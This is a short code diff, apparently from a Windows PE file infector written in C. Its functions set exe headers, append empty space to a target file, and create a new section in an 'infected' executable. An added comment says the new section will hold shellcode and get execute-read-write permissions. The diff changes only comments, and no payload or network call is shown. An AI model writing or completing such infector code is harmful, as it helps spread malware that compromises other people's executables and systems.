@@ -16,6 +16,7 @@ DWORD align(DWORD size, DWORD align, DWORD addr) {
 
 DWORD set_exe_headers(EXE_file* exe_file)
 {
+    /* Set the exe headers for future usage*/
     PIMAGE_SECTION_HEADER first_section_header = NULL;
     exe_file->dosHeader = exe_file->mapped_handle;
     DWORD relocation_table_end = 0;
@@ -54,7 +55,6 @@ DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_
 {
     // Return the origianl file size.
 
-    // Open file.
     HANDLE file_handle = CreateFileA(file_name, // open file
         FILE_APPEND_DATA,         // open for writing
         FILE_SHARE_READ,          // allow multiple readers
@@ -103,6 +103,7 @@ DWORD add_file_empty_place(PCHAR file_name, DWORD size_of_appned, DWORD* result_
 
 void create_new_section(EXE_file* infected, DWORD shellcode_size)
 {
+    /* Create new section at the end of the infected exe. The new infection will store the shellcode and will have execute-read-write permissions*/
     IMAGE_SECTION_HEADER new_section = { 0 };
 
     // Set new sections value.
